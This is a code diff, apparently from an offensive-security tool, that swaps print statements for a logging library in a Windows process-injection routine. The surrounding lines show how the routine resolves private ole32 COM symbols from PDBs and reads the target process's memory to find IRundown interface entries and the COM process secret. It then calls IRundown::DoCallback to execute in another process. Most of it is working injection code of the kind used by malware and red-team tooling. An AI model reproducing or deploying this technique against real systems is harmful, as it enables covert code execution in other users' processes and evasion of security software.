@@ -10,6 +10,7 @@
 #include "pdb.h"
 #include "fs.h"
 
+#include "logging.h"
 #include "scripts.h"
 
 #include "rpc/rundown.h"
@@ -128,7 +129,7 @@ ConnectToIRundown(OID oid, OXID oxid, IPID ipid) {
 
         HRESULT hr = CoInitialize(nullptr);
         if (FAILED(hr)) {
-            wprintf(L"  [-] unable to initialize COM, HRESULT = 0x%x\n", hr);
+            bblog::error("unable to initialize COM, HRESULT = 0x{:x}", hr);
             return false;
         }
 
@@ -158,7 +159,7 @@ ConnectToIRundown(OID oid, OXID oxid, IPID ipid) {
     HRESULT hr = CoGetObject(name.c_str(), NULL, IID_IRundown, (void**)&irundown);
 
     if (FAILED(hr)) {
-        wprintf(L"  [-] unable to create IRundown object, HRESULT = 0x%x\n", hr);
+        bblog::error("unable to create IRundown object, HRESULT = 0x{:x}", hr);
     }
 
     return irundown;
@@ -173,16 +174,14 @@ bool inject_com_irundown_docallback(uint32_t pid,
                                     RemoteProcessOpenMethod open_method,
                                     RemoteProcessMemoryMethod memory_method) {
 
-    wprintf(L"\nOpening the target process\n");
+    bblog::info("[*] Opening the target process");
 
     sysapi::unique_handle ProcessHandle = process_open(open_method, pid);
     if (ProcessHandle == NULL) {
         return false;
     }
 
-    wprintf(L"  [+] process opened, HANDLE = 0x%p\n", ProcessHandle.get());
-
-    wprintf(L"\nResolving and reading COM DLL structs...\n");
+    bblog::info("[*] Resolving and reading COM DLL structs...");
 
     wchar_t folder_path[MAX_PATH];
     GetTempPathW(MAX_PATH, folder_path);
@@ -193,7 +192,7 @@ bool inject_com_irundown_docallback(uint32_t pid,
     }
 
     if (!com_dll) {
-        wprintf(L"  [-] unable to get COM DLL handle");
+        bblog::error("unable to get COM DLL handle");
         return false;
     }
 
@@ -217,25 +216,25 @@ bool inject_com_irundown_docallback(uint32_t pid,
             return false;
         }
 
-        wprintf(L"  [+] RVA of CProcessSecret::s_guidOle32Secret = 0x%zx\n", ole32_secret_rva);
+        bblog::info("RVA of CProcessSecret::s_guidOle32Secret = 0x{:x}", ole32_secret_rva);
 
         if (!pdb::get_symbol_rva(ole32_palloc_rva, pdb_mapping.data, "CIPIDTable::_palloc")) {
             return false;
         }
 
-        wprintf(L"  [+] RVA of CIPIDTable::_palloc = 0x%zx\n", ole32_palloc_rva);
+        bblog::info("RVA of CIPIDTable::_palloc = 0x{:x}", ole32_palloc_rva);
 
         if (!pdb::get_symbol_rva(ole32_emptyctx_rva, pdb_mapping.data, "g_pMTAEmptyCtx")) {
             return false;
         }
 
-        wprintf(L"  [+] RVA of g_pMTAEmptyCtx = 0x%zx\n", ole32_emptyctx_rva);
+        bblog::info("RVA of g_pMTAEmptyCtx = 0x{:x}", ole32_emptyctx_rva);
 
         if (!pdb::get_field_offset(moxid_offset, pdb_mapping.data, "OXIDEntry", "_moxid")) {
             return false;
         }
 
-        wprintf(L"  [+] offset of OXIDEntry::_moxid field = 0x%zx\n", moxid_offset);
+        bblog::info("offset of OXIDEntry::_moxid field = 0x{:x}", moxid_offset);
 
         sysapi::SectionUnmapView(pdb_mapping.data);
     }
@@ -278,7 +277,7 @@ bool inject_com_irundown_docallback(uint32_t pid,
         return false;
     }
 
-    wprintf(L"\nLooking for valid IPID entries with IID_IRundown...\n");
+    bblog::info("[*] Looking for valid IPID entries with IID_IRundown...");
 
     std::vector<ipid_entry_t> ipid_entries;
 
@@ -316,16 +315,16 @@ bool inject_com_irundown_docallback(uint32_t pid,
             ipid_entry.oxid = oxid_oid.oxid;
             ipid_entry.oid = oxid_oid.oid;
 
-            wprintf(L"  [+] valid entry found, OXID = 0x%I64x, IPID = %s\n",
+            bblog::info("valid entry found, OXID = 0x{:016x}, IPID = {}",
                     ipid_entry.oxid,
-                    str::to_wstring(ipid_entry.ipid).c_str()
+                    str::to_string(ipid_entry.ipid).c_str()
             );
 
             ipid_entries.push_back(ipid_entry);
         }
     }
 
-    wprintf(L"\nProcessing IPID entries and invoking IRundown::DoCallback()...\n");
+    bblog::info("[*] Processing IPID entries and invoking IRundown::DoCallback()...");
 
     // memoized stuff
     GUID Ole32Secret = IID_NULL;
@@ -336,10 +335,10 @@ bool inject_com_irundown_docallback(uint32_t pid,
         uint32_t tid = ((IPID_VALUES*)&ipid_entry.ipid)->tid;
         bool valid_tid = tid && tid != UINT16_MAX;
 
-        wprintf(L"  [*] binding to OXID = 0x%I64x, IPID = %s with %s COM context...\n",
+        bblog::info("binding to OXID = 0x{:016x}, IPID = {} with {} COM context...",
             ipid_entry.oxid,
-            str::to_wstring(ipid_entry.ipid).c_str(),
-            valid_tid ? L"thread" : L"global"
+            str::to_string(ipid_entry.ipid).c_str(),
+            valid_tid ? "thread" : "global"
         );
 
         auto irundown = ConnectToIRundown(ipid_entry.oid, ipid_entry.oxid, ipid_entry.ipid);
@@ -391,7 +390,7 @@ bool inject_com_irundown_docallback(uint32_t pid,
                     return false;
                 }
 
-                wprintf(L"  [ ] g_pMTAEmptyCtx addr = 0x%p\n", GlobalCtxAddr);
+                bblog::info("g_pMTAEmptyCtx addr = 0x{:x}", (uintptr_t)GlobalCtxAddr);
             }
 
             server_ctx_addr = GlobalCtxAddr;
@@ -413,7 +412,7 @@ bool inject_com_irundown_docallback(uint32_t pid,
 
             if (Ole32Secret == IID_NULL) {
 
-                wprintf(L"  [*] CProcessSecret::s_guidOle32Secret = %s, invoking IRundown::DoCallback() with invalid secret to init...\n", str::to_wstring(Ole32Secret).c_str());
+                bblog::info("CProcessSecret::s_guidOle32Secret = {}, invoking IRundown::DoCallback() with invalid secret to init...", str::to_string(Ole32Secret).c_str());
                 irundown->DoCallback(&params);
 
                 res = process_read_memory(ctx, (size_t)PTR_ADD(com_dll, ole32_secret_rva), &Ole32Secret, sizeof(Ole32Secret));
@@ -422,23 +421,23 @@ bool inject_com_irundown_docallback(uint32_t pid,
                 }
             }
 
-            wprintf(L"  [ ] CProcessSecret::s_guidOle32Secret = %s\n", str::to_wstring(Ole32Secret).c_str());
+            bblog::info("CProcessSecret::s_guidOle32Secret = {}", str::to_string(Ole32Secret).c_str());
         }
 
         params.guidProcessSecret = Ole32Secret;
 
         HRESULT hr = irundown->DoCallback(&params);
         if (FAILED(hr)) {
-            wprintf(L"  [-] IRundown::DoCallback() error, HRESULT = 0x%x\n", hr);
+            bblog::error("IRundown::DoCallback() error, HRESULT = 0x{:x}", hr);
             continue;
         }
 
-        wprintf(L"  [+] IRundown::DoCallback() success\n");
-        wprintf(L"\nSuccess\n");
+        bblog::info("IRundown::DoCallback() success");
+        bblog::info("[+] Success");
         return true;
     }
 
-    wprintf(L"\nError\n");
+    bblog::error("[-] Error");
     return false;
 }
 
